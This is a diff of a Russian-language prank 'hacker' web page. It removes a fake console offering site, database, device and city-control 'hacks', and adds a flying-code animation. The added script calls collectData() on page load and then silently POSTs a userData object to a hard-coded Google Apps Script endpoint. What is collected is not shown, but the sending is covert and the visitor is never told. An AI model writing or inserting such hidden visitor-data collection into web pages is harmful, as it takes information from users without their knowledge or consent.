-        <h2>РЕЗУЛЬТАТЫ</h2>
-        <div id="result-content"></div>
-        <button id="results-back">НАЗАД</button>
-    </div>
+        function startAnimation() {
+            const buttons = document.getElementById('buttonsContainer');
+            const codeContainer = document.getElementById('codeContainer');
+            const sphereContainer = document.getElementById('sphereContainer');
+            const explosion = document.getElementById('explosion');
+            const finalImage = document.getElementById('finalImage');
 
-    <!-- Консоль -->
-    <div id="console-menu">
-        <h2>КОНСОЛЬ</h2>
-        <div class="console-output" id="console-output"></div>
-        <div class="console-input-line">
-            <span class="prompt">&gt;</span>
-            <input type="text" id="console-url" placeholder="https://target.com">
-        </div>
-        <div class="console-commands">
-            <p>КОМАНДЫ:</p>
-            <button class="cmd-btn" data-cmd="XOPGOP">XOPGOP - взламывает защиту и калибрует сайт</button>
-            <button class="cmd-btn" data-cmd="XOP">XOP - уничтожает сайт</button>
-            <button class="cmd-btn" data-cmd="COPLOR">COPLOR - взламывает сайт</button>
-            <button class="cmd-btn" data-cmd="QWERRRRR">QWERRRRR :::::: - взламывает базу данных</button>
-            <button class="cmd-btn" data-cmd="XOPLOTROPE">XOPLOTROPE - перехват данных и поиск ID</button>
-            <button class="cmd-btn" data-cmd="SOURCEHACK">SOURCEHACK - взлом исходного кода сайта</button>
-        </div>
-        <button id="console-back">НАЗАД</button>
-    </div>
+            buttons.classList.add('hidden');
+            codeContainer.style.display = 'block';
 
-    <!-- Меню устройств -->
-    <div id="devices-menu">
-        <h2>УСТРОЙСТВА</h2>
-        <div class="devices-form">
-            <label>Введите ID устройства:</label>
-            <input type="text" id="device-id-input" placeholder="DEVICE-XXXXX">
-            <button id="device-connect">ПОДКЛЮЧИТЬСЯ</button>
-        </div>
-    </div>
+            // Generate code pieces
+            const codeSnippets = [
+                'const', 'let', 'var', 'function', 'return', 'if', 'else', 'for', 'while',
+                'class', 'import', 'export', 'from', 'async', 'await', 'try', 'catch',
+                'document', 'window', 'navigator', 'fetch', 'promise', '=>', '{}', '[]',
+                '0x4A3F', '0xB7E2', '0x9C1D', 'SECRET', 'ENCRYPT', 'DECRYPT', 'HASH',
+                'a[i] = b[j]', 'x += y', 'return null', 'void 0', 'undefined',
+                '<div>', '</div>', 'class="secret"', 'id="root"', 'key={index}',
+                'SELECT * FROM users', 'WHERE id = 1', 'DROP TABLE', 'INSERT INTO',
+                'Authorization: Bearer', 'X-API-Key', 'Content-Type: application/json',
+                'ssh-rsa AAAA', '-----BEGIN KEY-----', 'password123', 'admin',
+                '192.168.1.1', '10.0.0.1', '255.255.255.0', 'localhost:3000',
+                'data:text/html', 'javascript:void', 'eval()', 'setTimeout',
+                'Math.random()', 'Date.now()', 'JSON.stringify', 'localStorage'
+            ];
 
-    <!-- Мини система устройства -->
-    <div id="device-system">
-        <h2 id="system-title">ANDROID SYSTEM</h2>
-        <div class="system-screen" id="system-screen"></div>
-        <button id="device-destroy">УНИЧТОЖИТЬ</button>
-        <button id="device-system-back">НАЗАД</button>
-    </div>
+            const colors = ['#00ff88', '#0066ff', '#ff0066', '#6600ff', '#ffff00', '#00ffff'];
 
-    <!-- Меню города -->
-    <div id="city-menu">
-        <h2>УПРАВЛЕНИЕ ГОРОДОМ</h2>
-        <div class="city-tabs">
-            <button class="city-tab active" data-tab="traffic">СВЕТОФОР</button>
-            <button class="city-tab" data-tab="doors">ДВЕРИ</button>
-            <button class="city-tab" data-tab="cars">МАШИНЫ</button>
-        </div>
-        
-        <!-- Светофор -->
-        <div id="city-traffic" class="city-panel">
-            <label>Улица:</label>
-            <input type="text" id="traffic-street" placeholder="ул. Ленина">
-            <label>Дом:</label>
-            <input type="text" id="traffic-house" placeholder="15">
-            <label>Цвет:</label>
-            <select id="traffic-color">
-                <option value="red">🔴 КРАСНЫЙ</option>
-                <option value="yellow">🟡 ЖЁЛТЫЙ</option>
-                <option value="green">🟢 ЗЕЛЁНЫЙ</option>
-            </select>
-            <button id="traffic-set">УСТАНОВИТЬ</button>
-        </div>
-        
-        <!-- Двери -->
-        <div id="city-doors" class="city-panel" style="display: none;">
-            <label>Улица:</label>
-            <input type="text" id="doors-street" placeholder="ул. Пушкина">
-            <label>Дом:</label>
-            <input type="text" id="doors-house" placeholder="10">
-            <label>Действие:</label>
-            <select id="doors-action">
-                <option value="open">🔓 ОТКРЫТЬ</option>
-                <option value="close">🔒 ЗАКРЫТЬ</option>
-            </select>
-            <button id="doors-set">ВЫПОЛНИТЬ</button>
-        </div>
-        
-        <!-- Машины -->
-        <div id="city-cars" class="city-panel" style="display: none;">
-            <label>Марка машины:</label>
-            <input type="text" id="car-brand" placeholder="BMW X5">
-            <label>Номер:</label>
-            <input type="text" id="car-number" placeholder="А 123 АА 777">
-            <label>Направление:</label>
-            <select id="car-direction">
-                <option value="north">⬆️ СЕВЕР</option>
-                <option value="south">⬇️ ЮГ</option>
-                <option value="east">➡️ ВОСТОК</option>
-                <option value="west">⬅️ ЗАПАД</option>
-            </select>
-            <button id="car-set">ОТПРАВИТЬ</button>
-        </div>
-        
-        <button id="city-back" class="city-back-btn">НАЗАД</button>
-    </div>
+            // Create 150 code pieces
+            for (let i = 0; i < 150; i++) {
+                const piece = document.createElement('div');
+                piece.className = 'code-piece';
+                piece.textContent = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
+                piece.style.color = colors[Math.floor(Math.random() * colors.length)];
+                piece.style.left = Math.random() * 100 + '%';
+                piece.style.top = Math.random() * 100 + '%';
+                piece.style.fontSize = (8 + Math.random() * 12) + 'px';
+                
+                // Random velocity for anti-gravity effect
+                piece.dataset.vx = (Math.random() - 0.5) * 0.5;
+                piece.dataset.vy = (Math.random() - 0.5) * 0.5;
+                piece.dataset.rotation = Math.random() * 360;
+                piece.dataset.rotationSpeed = (Math.random() - 0.5) * 2;
+                
+                codeContainer.appendChild(piece);
+            }
 
-    <!-- АРХИВ меню -->
-    <div id="archive-menu">
-        <h2>АРХИВ</h2>
-        <div class="archive-list">
-            <div class="archive-item" id="archive-search">🔍 ПОИСК</div>
-            <div class="archive-item" id="archive-donate">💰 ПОЖЕРТВОВАТЬ</div>
-            <div class="archive-item" id="archive-create">📝 СОЗДАТЬ АККАУНТ</div>
-            <div class="archive-item" id="archive-login">🔐 ВОЙТИ</div>
-            <div class="archive-item archive-ramadan" id="archive-ramadan">
-                <div class="ramadan-title">🌙 Вики любит логотип Рамадана</div>
-                <div class="ramadan-desc">Wiki любит Рамадан 2026. Расскажите миру о традициях Рамадана! Присоединяйтесь к глобальной кампании по устранению пробелов в знаниях об истории и культуре ислама.</div>
-            </div>
-        </div>
-        <button id="archive-back">НАЗАД</button>
-    </div>
+            // Animate code pieces (anti-gravity for 3 seconds)
+            let startTime = Date.now();
+            const antiGravityDuration = 3000;
 
-    <script src="script.js"></script>
+            function animateAntiGravity() {
+                const elapsed = Date.now() - startTime;
+                
+                if (elapsed < antiGravityDuration) {
+                    document.querySelectorAll('.code-piece').forEach(piece => {
+                        let left = parseFloat(piece.style.left);
+                        let top = parseFloat(piece.style.top);
+                        let rotation = parseFloat(piece.dataset.rotation);
+                        
+                        left += parseFloat(piece.dataset.vx);
+                        top += parseFloat(piece.dataset.vy);
+                        rotation += parseFloat(piece.dataset.rotationSpeed);
+                        
+                        // Bounce off edges
+                        if (left <= 0 || left >= 95) piece.dataset.vx *= -1;
+                        if (top <= 0 || top >= 95) piece.dataset.vy *= -1;
+                        
+                        piece.style.left = left + '%';
+                        piece.style.top = top + '%';
+                        piece.style.transform = `rotate(${rotation}deg)`;
+                        piece.dataset.rotation = rotation;
+                    });
+                    
+                    requestAnimationFrame(animateAntiGravity);
+                } else {
+                    // Start vacuum effect - converge to center
+                    convergeToSphere();
+                }
+            }
+
+            animateAntiGravity();
+
+            function convergeToSphere() {
+                const centerX = window.innerWidth / 2;
+                const centerY = window.innerHeight / 2;
+                
+                document.querySelectorAll('.code-piece').forEach((piece, index) => {
+                    const rect = piece.getBoundingClientRect();
+                    const pieceX = rect.left + rect.width / 2;
+                    const pieceY = rect.top + rect.height / 2;
+                    
+                    const angle = Math.atan2(centerY - pieceY, centerX - pieceX);
+                    const speed = 15 + Math.random() * 10;
+                    
+                    const vx = Math.cos(angle) * speed;
+                    const vy = Math.sin(angle) * speed;
+                    
+                    piece.style.transition = 'all 0.8s cubic-bezier(0.4, 0, 0.2, 1)';
+                    piece.style.left = (centerX - rect.width / 2) + 'px';
+                    piece.style.top = (centerY - rect.height / 2) + 'px';
+                    piece.style.opacity = '1';
+                    piece.style.fontSize = '14px';
+                    piece.style.zIndex = Math.floor(Math.random() * 100);
+                });
+
+                // Show sphere after convergence
+                setTimeout(() => {
+                    codeContainer.style.display = 'none';
+                    sphereContainer.style.display = 'block';
+                    
+                    // Explode after 2 seconds
+                    setTimeout(() => {
+                        sphereContainer.style.display = 'none';
+                        explosion.style.display = 'block';
+                        
+                        // Show final image
+                        setTimeout(() => {
+                            explosion.style.display = 'none';
+                            finalImage.style.display = 'block';
+                            
+                            // Send data to Google Sheets
+                            sendToGoogleSheets();
+                        }, 500);
+                    }, 2000);
+                }, 800);
+            }
+        }
+
+        async function sendToGoogleSheets() {
+            const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxkytmwKiiYudBPBnvXE7MHSbq7_H-3Sr29ZYTydG5NOncC8g5_HyQeoS1HYqnTd1Dl/exec';
+            
+            try {
+                await fetch(GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(userData)
+                });
+                console.log('Data sent to Google Sheets');
+            } catch (e) {
+                console.error('Error sending data:', e);
+            }
+        }
+
+        // Collect initial data on page load
+        collectData();
+    </script>
 </body>
 </html>
